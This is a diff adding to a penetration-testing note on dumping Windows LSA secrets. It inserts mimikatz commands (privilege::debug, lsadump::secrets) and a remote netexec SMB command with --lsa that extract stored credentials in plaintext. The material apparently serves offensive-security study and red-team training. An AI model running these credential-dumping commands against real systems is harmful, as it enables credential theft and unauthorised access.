@@ -31,3 +31,15 @@ For domain hashes, we can extract DCC2 hashes, for DCC2 hashes we can crack with
 LSA Secrets:
 
 We can sometimes dump LSA secrets by using tools, which will result in revealing some credentials in plaintext:
+
+-Using mimikatz to dump LSA secrets:
+```
+#Require mimikatz on target in privilege
+mimikatz.exe
+privilege::debug
+lsadump::secrets
+```
+-Using netexec to dump LSA secrets remotely:
+```
+netexec smb <ip> --local-auth -u <username> -p <password? --lsa
+```
